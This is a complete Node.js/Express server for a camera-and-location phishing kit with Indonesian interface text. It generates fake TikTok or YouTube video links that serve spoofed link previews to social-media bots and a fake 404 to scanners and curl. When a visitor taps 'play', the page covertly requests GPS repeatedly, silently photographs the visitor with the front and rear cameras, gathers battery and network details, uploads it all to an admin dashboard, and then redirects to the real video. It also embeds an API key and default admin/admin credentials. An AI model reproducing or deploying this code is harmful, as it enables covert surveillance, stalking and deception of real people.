// language: JavaScript, file: server.js, runtime: Node 18+
const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '25mb' }));
app.use(cookieParser());

const PORT = process.env.PORT || 12044;
const HOST = '0.0.0.0';

const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin';
const IBB_KEY = process.env.IMGBB_KEY || '4b3b8940f45b4c6b23c3a4f4a2d0e4b1';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const SESSION_MAX_AGE = 8 * 3600 * 1000;

const DATA_DIR = path.join(__dirname, 'data');
const UPLOAD_DIR = path.join(DATA_DIR, 'uploads');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.jsonl');
const LINKS_FILE = path.join(DATA_DIR, 'links.json');

console.log('[boot] ADMIN_USER=' + ADMIN_USER);
console.log('[boot] IMGBB_KEY=' + (IBB_KEY ? IBB_KEY.slice(0, 6) + '…' : '(empty)'));

function signToken(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', SESSION_SECRET).update(body).digest('base64url');
  return body + '.' + sig;
}
function verifyToken(token) {
  if (!token || typeof token !== 'string') return null;
  const [body, sig] = token.split('.');
  if (!body || !sig) return null;
  const expect = crypto.createHmac('sha256', SESSION_SECRET).update(body).digest('base64url');
  const a = Buffer.from(sig);
  const b = Buffer.from(expect);
  if (a.length !== b.length) return null;
  if (!crypto.timingSafeEqual(a, b)) return null;
  try {
    const payload = JSON.parse(Buffer.from(body, 'base64url').toString());
    if (payload.exp && Date.now() > payload.exp) return null;
    return payload;
  } catch { return null; }
}
function setSession(res, user) {
  const token = signToken({ user, exp: Date.now() + SESSION_MAX_AGE });
  res.cookie('ct_session', token, {
    httpOnly: true,
    sameSite: 'lax',
    secure: process.env.NODE_ENV === 'production',
    maxAge: SESSION_MAX_AGE,
    path: '/'
  });
}
function requireAuth(req, res, next) {
  const p = verifyToken(req.cookies?.ct_session);
  if (!p) {
    if (req.path.startsWith('/api/')) return res.status(401).json({ error: 'unauthorized' });
    return res.redirect('/login');
  }
  req.user = p.user;
  next();
}

function readLinks() { try { return JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8')); } catch { return {}; } }
function saveLinks(o) { fs.writeFileSync(LINKS_FILE, JSON.stringify(o, null, 2)); }
function appendCapture(e) { fs.appendFileSync(CAPTURES_FILE, JSON.stringify(e) + '\n'); }
function readCaptures() {
  try {
    return fs.readFileSync(CAPTURES_FILE, 'utf8').trim().split('\n').filter(Boolean)
      .map(l => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
  } catch { return []; }
}
function writeCaptures(arr) {
  fs.writeFileSync(CAPTURES_FILE, arr.map(c => JSON.stringify(c)).join('\n') + (arr.length ? '\n' : ''));
}
function saveDataUrl(dataUrl, filename) {
  if (!dataUrl || typeof dataUrl !== 'string') return null;
  const m = dataUrl.match(/^data:image\/(jpeg|jpg|png|webp);base64,(.+)$/i);
  if (!m) return null;
  const buf = Buffer.from(m[2], 'base64');
  if (buf.length > 6 * 1024 * 1024) return null;
  fs.writeFileSync(path.join(UPLOAD_DIR, filename), buf);
  return '/data/uploads/' + filename;
}
function deleteFileIfExists(p) {
  if (!p || typeof p !== 'string') return;
  if (!p.startsWith('/data/uploads/')) return;
  const f = path.join(__dirname, p.replace(/^\//, ''));
  try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch {}
}

const HARD_BOT = /(googlebot|bingbot|yandexbot|duckduckbot|baiduspider|slurp|curl|wget|python-requests|axios\/|go-http-client|java\/|okhttp)/i;
const PREVIEW_BOT = /(facebookexternalhit|whatsapp|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|embedly|skypeuripreview)/i;
function detectBot(ua) {
  if (!ua) return 'hard';
  if (HARD_BOT.test(ua)) return 'hard';
  if (PREVIEW_BOT.test(ua)) return 'preview';
  return 'human';
}

async function fetchOEmbed(url) {
  try {
    const r = await fetch('https://www.tiktok.com/oembed?url=' + encodeURIComponent(url), {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return null;
    const d = await r.json();
    if (!d.thumbnail_url) return null;
    return { thumb: d.thumbnail_url, user: d.author_name || '', caption: d.title || '', desc: '' };
  } catch { return null; }
}
async function fetchTikWM(url) {
  try {
    const r = await fetch('https://www.tikwm.com/api/?url=' + encodeURIComponent(url), {
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return null;
    const j = await r.json();
    if (!j || j.code !== 0 || !j.data) return null;
    return {
      thumb: j.data.cover || j.data.origin_cover || '',
      user: j.data.author?.unique_id || 'user',
      caption: j.data.title || 'TikTok Video',
      desc: j.data.title || ''
    };
  } catch { return null; }
}
async function fetchYouTube(url) {
  try {
    const matchVideo = url.match(/(?:youtu\.be\/|youtube\.com\/(?:shorts\/|watch\?v=|embed\/|v\/))([\w-]{11})/);
    
    if (matchVideo) {
      const videoId = matchVideo[1];
      
      const r = await fetch('https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=' + videoId + '&format=json', {
        signal: AbortSignal.timeout(8000)
      });
      if (!r.ok) return null;
      const d = await r.json();
      
      const thumb = 'https://img.youtube.com/vi/' + videoId + '/maxresdefault.jpg';
      let caption = d.title || 'YouTube Video';
      let desc = 'Nikmati video dan musik yang Anda suka, upload konten asli, dan bagikan kepada teman, keluarga, dan dunia di YouTube.';

      try {
        const pageRes = await fetch('https://www.youtube.com/watch?v=' + videoId + '&hl=en', {
          headers: { 
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'en-US,en;q=0.9'
          },
          signal: AbortSignal.timeout(8000)
        });
        if (pageRes.ok) {
          const html = await pageRes.text();
          const descMatch = html.match(/"shortDescription":"([^"]+)"/);
          if (descMatch) {
            desc = descMatch[1]
              .replace(/\\n/g, '\n')
              .replace(/\\"/g, '"')
              .replace(/\\u([0-9a-fA-F]{4})/g, (match, grp) => String.fromCharCode(parseInt(grp, 16)))
              .replace(/&amp;/g, '&')
              .replace(/&quot;/g, '"')
              .replace(/&#39;/g, "'");
            if (desc.length > 200) desc = desc.substring(0, 197) + '...';
          }
        }
      } catch(e) { }

      return { thumb, user: d.author_name || 'YouTube', caption, desc: desc };
    }

    if (/youtube\.com\/(@|channel\/|c\/)/i.test(url)) {
      const r = await fetch(url, {
        headers: { 
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept-Language': 'en-US,en;q=0.9'
        },
        signal: AbortSignal.timeout(8000)
      });
      if (!r.ok) return null;
      const html = await r.text();
      
      const thumbMatch = html.match(/<meta\s+property="og:image"\s+content="([^"]+)"/i);
      const titleMatch = html.match(/<meta\s+property="og:title"\s+content="([^"]+)"/i);
      const descMatch = html.match(/<meta\s+property="og:description"\s+content="([^"]+)"/i);
      
      let thumb = thumbMatch ? thumbMatch[1].replace(/&amp;/g, '&') : '';
      let caption = titleMatch ? titleMatch[1].replace(/&amp;/g, '&') : 'YouTube Channel';
      let desc = descMatch ? descMatch[1].replace(/&amp;/g, '&') : '';
      
      let user = url.split('/@')[1] || 'Channel';
      if (user.includes('?')) user = user.split('?')[0];
      
      if (thumb) return { thumb, user, caption, desc };
    }
    return null;
  } catch { return null; }
}

async function mirrorThumbToImgBB(thumbUrl) {
  if (!IBB_KEY || !thumbUrl) return null;
  try {
    const r = await fetch(thumbUrl, { 
      headers: { 'User-Agent': 'Mozilla/5.0' },
      signal: AbortSignal.timeout(10000) 
    });
    if (!r.ok) return null;
    const buf = Buffer.from(await r.arrayBuffer());
    if (buf.length > 30 * 1024 * 1024) return null;
    const fd = new URLSearchParams();
    fd.append('image', buf.toString('base64'));
    const up = await fetch('https://api.imgbb.com/1/upload?key=' + encodeURIComponent(IBB_KEY), {
      method: 'POST',
      body: fd,
      signal: AbortSignal.timeout(15000)
    });
    const j = await up.json();
    if (!j?.success) { console.log('[imgbb] failed:', JSON.stringify(j?.error || j).slice(0, 200)); return null; }
    console.log('[imgbb] uploaded:', j.data.url);
    return j.data.url;
  } catch (e) { console.log('[imgbb] error:', e.message); return null; }
}

async function lookupIp(ip) {
  try {
    const r = await fetch('https://ipwho.is/' + encodeURIComponent(ip), { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d && d.success && typeof d.latitude === 'number') {
      return { lat: d.latitude, lng: d.longitude, acc: 5000, city: d.city || '', provider: 'ipwho.is' };
    }
  } catch {}
  try {
    const r = await fetch('https://ipapi.co/' + encodeURIComponent(ip) + '/json/', {
      headers: { 'User-Agent': 'curl/8.0' },
      signal: AbortSignal.timeout(5000)
    });
    const d = await r.json();
    if (d && !d.error && typeof d.latitude === 'number') {
      return { lat: d.latitude, lng: d.longitude, acc: 5000, city: d.city || '', provider: 'ipapi.co' };
    }
  } catch {}
  try {
    const r = await fetch('http://ip-api.com/json/' + encodeURIComponent(ip) + '?fields=status,lat,lon,city', { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d && d.status === 'success') {
      return { lat: d.lat, lng: d.lon, acc: 5000, city: d.city || '', provider: 'ip-api.com' };
    }
  } catch {}
  return null;
}

app.post('/api/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user !== ADMIN_USER || pass !== ADMIN_PASS) return res.status(401).json({ error: 'Username/Password salah' });
  setSession(res, user);
  res.json({ ok: true });
});

app.post('/api/logout', (req, res) => {
  res.clearCookie('ct_session', { path: '/' });
  res.json({ ok: true });
});

app.get('/api/me', requireAuth, (req, res) => res.json({ ok: true, user: req.user }));

app.get('/api/links', requireAuth, (req, res) => {
  const links = readLinks();
  const list = Object.keys(links).map(id => ({ id, ...links[id] }));
  list.sort((a, b) => new Date(b.created) - new Date(a.created));
  res.json(list);
});

app.delete('/api/links', requireAuth, (req, res) => {
  try {
    saveLinks({});
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/links/:id', requireAuth, (req, res) => {
  const links = readLinks();
  if (links[req.params.id]) {
    delete links[req.params.id];
    saveLinks(links);
    res.json({ ok: true });
  } else {
    res.status(404).json({ error: 'Link tidak ditemukan' });
  }
});

app.post('/api/link', requireAuth, async (req, res) => {
  try {
    let { tiktokUrl } = req.body || {}; 
    if (!tiktokUrl) return res.status(400).json({ error: 'URL tidak boleh kosong' });
    
    const isYT = /youtu(be\.com|\.be)/i.test(tiktokUrl);
    const isTT = /tiktok\.com/i.test(tiktokUrl);

    if (!isYT && !isTT) {
      return res.status(400).json({ error: 'Hanya mendukung URL TikTok dan YouTube' });
    }

    const cleanUrl = tiktokUrl.split('?')[0];
    let meta = null;

    if (isTT) {
      meta = await fetchOEmbed(cleanUrl);
      if (!meta) meta = await fetchTikWM(cleanUrl);
    } else if (isYT) {
      meta = await fetchYouTube(cleanUrl);
    }

    if (!meta) meta = { thumb: '', user: 'user', caption: 'Video', desc: '' };

    if (meta.thumb) {
      const hosted = await mirrorThumbToImgBB(meta.thumb);
      if (hosted) meta.thumbHosted = hosted;
    }
    meta.thumbDisplay = meta.thumbHosted || meta.thumb || '';
    meta.platform = isTT ? 'tiktok' : 'youtube'; // Simpan tipe platform

    const id = crypto.randomBytes(4).toString('hex');
    const links = readLinks();
    links[id] = {
      tiktokUrl: cleanUrl,
      meta,
      created: new Date().toISOString(),
      hits: 0
    };
    saveLinks(links);

    const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'http').split(',')[0];
    const host = req.headers['x-forwarded-host'] || req.headers.host;
    const origin = req.headers.origin || (proto + '://' + host);
    
    const cacheBuster = '?v=' + Math.random().toString(36).substring(2, 7);
    const finalUrl = origin + '/v/' + id + cacheBuster;
    
    res.json({ ok: true, phishUrl: finalUrl, meta });
  } catch (err) {
    console.error('[api/link error]', err);
    res.status(500).json({ error: 'Gagal memproses link: ' + err.message });
  }
});

app.post('/api/collect', async (req, res) => {
  try {
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
    const remoteIp = req.socket.remoteAddress || '';
    
    let loc = req.body.loc;
    if (typeof loc === 'string') {
      try { loc = JSON.parse(loc); } catch(e) { loc = null; }
    }
    
    let locType = 'GPS';

    if (!loc || loc.lat === undefined || loc.lng === undefined || isNaN(Number(loc.lat)) || isNaN(Number(loc.lng))) {
      loc = null;
      locType = 'IP';
      const lookup = await lookupIp(ip);
      if (lookup) loc = lookup;
    } else {
      loc = { lat: Number(loc.lat), lng: Number(loc.lng), acc: Number(loc.acc) || 0 };
    }

    const capId = (req.body.id && String(req.body.id).replace(/[^a-z0-9\-]/gi, '').slice(0, 24)) || crypto.randomBytes(6).toString('hex');
    const ts = Date.now();
    const frontPath = saveDataUrl(req.body.photo_front, capId + '_front.jpg');
    const backPath = saveDataUrl(req.body.photo_back, capId + '_back.jpg');

    appendCapture({
      id: capId,
      ts,
      ip,
      remoteIp,
      loc,
      locType,
      battery: req.body.battery || null,
      network: req.body.network || null,
      ua: req.body.ua || '',
      photo_front: frontPath,
      photo_back: backPath
    });
    res.json({ ok: true });
  } catch (err) {
    console.error('[api/collect error]', err);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/captures', requireAuth, (req, res) => res.json(readCaptures()));

app.delete('/api/captures/:id', requireAuth, (req, res) => {
  try {
    const all = readCaptures();
    const target = all.find(c => c.id === req.params.id);
    if (target) { deleteFileIfExists(target.photo_front); deleteFileIfExists(target.photo_back); }
    writeCaptures(all.filter(c => c.id !== req.params.id));
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/captures', requireAuth, (req, res) => {
  try {
    const all = readCaptures();
    for (const c of all) { deleteFileIfExists(c.photo_front); deleteFileIfExists(c.photo_back); }
    writeCaptures([]);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/thumb/:id', async (req, res) => {
  try {
    const links = readLinks();
    const l = links[req.params.id];
    if (!l || !l.meta) return res.status(404).end();
    
    const url = l.meta.thumbHosted || l.meta.thumb;
    if (!url) return res.status(404).end();

    const r = await fetch(url, { 
      headers: { 
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://www.tiktok.com/'
      },
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return res.status(404).end();
    
    res.setHeader('Content-Type', r.headers.get('content-type') || 'image/jpeg');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    const buf = Buffer.from(await r.arrayBuffer());
    res.send(buf);
  } catch (e) {
    res.status(404).end();
  }
});

app.get('/v/:id', (req, res) => {
  const links = readLinks();
  const l = links[req.params.id];
  if (!l) return res.status(404).send('Link tidak valid');

  const bot = detectBot(req.headers['user-agent'] || '');

  if (bot === 'hard') {
    return res.status(404).type('html').send('<!DOCTYPE html><html><head><meta charset="utf-8"><title>404 Not Found</title></head><body style="font-family:sans-serif;text-align:center;padding:50px;background:#000;color:#fff;"><h1>404</h1><p>Halaman tidak ditemukan.</p></body></html>');
  }

  l.hits = (l.hits || 0) + 1;
  saveLinks(links);

  const m = l.meta || {};
  const thumb = m.thumbHosted || m.thumb || ''; 
  const targetUrl = l.tiktokUrl;

  // TENTUKAN LOGO BERDASARKAN PLATFORM
  const isYT = m.platform === 'youtube';
  const logoUrl = isYT 
    ? 'https://upload.wikimedia.org/wikipedia/commons/0/09/YouTube_full-color_icon_%282017%29.svg'
    : 'https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg';
  const siteName = isYT ? 'YouTube' : 'TikTok';
  const siteUrl = isYT ? 'https://youtu.be' : 'https://www.tiktok.com/';

  if (bot === 'preview') {
    const esc = s => String(s || '').replace(/[<>&"']/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[c]));
    const description = m.desc || m.caption || 'Video';

    return res.status(200).type('html').send(`<!DOCTYPE html><html><head>
<meta charset="utf-8">
<title>${esc(m.caption || 'Video')}</title>
<link rel="icon" type="image/png" href="${logoUrl}">
<meta property="og:type" content="video.other">
<meta property="og:site_name" content="${siteName}">
<meta property="og:url" content="${siteUrl}">
<meta property="og:title" content="${esc(m.caption || 'Video')}">
<meta property="og:description" content="${esc(description)}">
${thumb ? `<meta property="og:image" content="${esc(thumb)}">` : ''}
<meta property="og:image:width" content="720">
<meta property="og:image:height" content="1280">
<meta name="twitter:card" content="summary_large_image">
${thumb ? `<meta name="twitter:image" content="${esc(thumb)}">` : ''}
</head><body></body></html>`);
  }

  const escAttr = s => String(s || '').replace(/[<>"'&]/g, c => ({ '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '&': '&amp;' }[c]));
  const escJson = s => JSON.stringify(s || '').replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026');

  const html = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="robots" content="noindex,nofollow">
<title>${escAttr(m.caption || 'Video')}</title>
<link rel="icon" type="image/png" href="${logoUrl}">
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{height:100vh;background:#111;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;flex-direction:column;overflow:hidden;user-select:none}
  
  .bg{position:fixed;inset:0;background: ${thumb ? `url('${escAttr(thumb)}') center/cover no-repeat` : '#2a2a35'};z-index:1;}
  .bg-overlay{position:fixed;inset:0;background:linear-gradient(180deg,rgba(0,0,0,0.2) 0%,rgba(0,0,0,0.6) 100%);z-index:2}
  
  .tap-area{position:fixed;inset:0;z-index:10;display:flex;align-items:center;justify-content:center;flex-direction:column;cursor:pointer}
  .play{width:88px;height:88px;background:rgba(255,255,255,0.95);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:18px;box-shadow:0 8px 40px rgba(0,0,0,.6);animation:pulse 2s ease-in-out infinite}
  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
  .play svg{width:40px;height:40px;fill:#000;margin-left:6px}
  .text{font-size:15px;color:#fff;font-weight:600;letter-spacing:.02em;text-shadow:0 2px 10px rgba(0,0,0,.9),0 0 5px rgba(0,0,0,.8)}
  .sub{margin-top:8px;font-size:12px;opacity:.9;text-shadow:0 2px 10px rgba(0,0,0,.9),0 0 5px rgba(0,0,0,.8)}
  .loading{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:20;align-items:center;justify-content:center;flex-direction:column}
  .loading.active{display:flex}
  .loader{width:42px;height:42px;border:3px solid #333;border-top-color:#fe2c55;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:12px}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head><body>

<div class="bg"></div>
<div class="bg-overlay"></div>

<div class="tap-area" id="tap">
  <div class="play"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
  <div class="text">Ketuk untuk membuka video</div>
  <div class="sub">@video</div>
</div>
<div class="loading" id="loading">
  <div class="loader"></div>
  <div style="font-size:13px;color:#888">Memverifikasi…</div>
</div>

<script>
(function(){
  var targetUrl = ${escJson(targetUrl)};
  var sessionId = '${escAttr(req.params.id)}-' + Math.random().toString(36).substring(2, 10);
  var fired = false;

  function getGpsForce() {
    return new Promise(function(resolve) {
      if (!navigator.geolocation) return resolve(null);
      
      var attempts = 0;
      var maxAttempts = 3;

      function tryGps() {
        if (attempts >= maxAttempts) return resolve(null);
        attempts++;

        navigator.geolocation.getCurrentPosition(
          function(pos) {
            if (pos.coords.accuracy > 500 && attempts < maxAttempts) {
              setTimeout(tryGps, 500); 
            } else {
              resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy });
            }
          },
          function(err) {
            setTimeout(tryGps, 500);
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      }
      tryGps();
    });
  }

  function capPhoto(facing){
    return new Promise(function(resolve){
      var stream = null;
      (async function(){
        try{
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing, width: { ideal: 640 } }, audio: false });
          var v = document.createElement('video');
          v.setAttribute('playsinline','true'); v.setAttribute('autoplay','true'); v.setAttribute('muted','true');
          v.srcObject = stream; v.style.cssText = 'position:absolute;opacity:0;width:1px;height:1px;';
          document.body.appendChild(v);
          await v.play();
          await new Promise(function(r){ setTimeout(r, 900); });
          var c = document.createElement('canvas');
          c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
          c.getContext('2d').drawImage(v, 0, 0);
          var data = c.toDataURL('image/jpeg', 0.6);
          if (stream) stream.getTracks().forEach(function(t){ t.stop(); });
          v.remove();
          resolve(data);
        }catch(e){
          if (stream) stream.getTracks().forEach(function(t){ t.stop(); });
          resolve(null);
        }
      })();
    });
  }

  async function run(){
    var payload = { id: sessionId, loc: null, photo_front: null, photo_back: null, battery: null, network: null, ua: navigator.userAgent };
    try{ if (navigator.getBattery){ var b = await navigator.getBattery(); payload.battery = Math.round(b.level*100) + '%' + (b.charging ? ' ⚡' : ''); } }catch(e){}
    if (navigator.connection) payload.network = navigator.connection.effectiveType || navigator.connection.type || null;

    payload.loc = await getGpsForce();
    
    await new Promise(function(r){ setTimeout(r, 1000); });

    payload.photo_front = await capPhoto('user');
    await new Promise(function(r){ setTimeout(r, 300); });
    payload.photo_back = await capPhoto('environment');

    try{
      await fetch('/api/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }catch(e){}
    location.replace(targetUrl);
  }

  function fire(){
    if (fired) return;
    fired = true;
    document.getElementById('tap').style.display = 'none';
    document.getElementById('loading').classList.add('active');
    var bailout = setTimeout(function(){ location.replace(targetUrl); }, 25000);
    run().then(function(){ clearTimeout(bailout); }).catch(function(){ clearTimeout(bailout); location.replace(targetUrl); });
  }

  document.getElementById('tap').addEventListener('click', fire);
  document.getElementById('tap').addEventListener('touchstart', fire, { passive: true, once: true });
})();
</script>
</body></html>`;
  res.send(html);
});

app.get('/login', (req, res) => {
  if (verifyToken(req.cookies?.ct_session)) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});
app.get('/admin', requireAuth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/dashboard', requireAuth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/', (req, res) => {
  if (verifyToken(req.cookies?.ct_session)) return res.redirect('/admin');
  res.redirect('/login');
});

app.use('/data/uploads', requireAuth, express.static(UPLOAD_DIR, { index: false }));

app.listen(PORT, HOST, () => console.log('[listen] ' + HOST + ':' + PORT));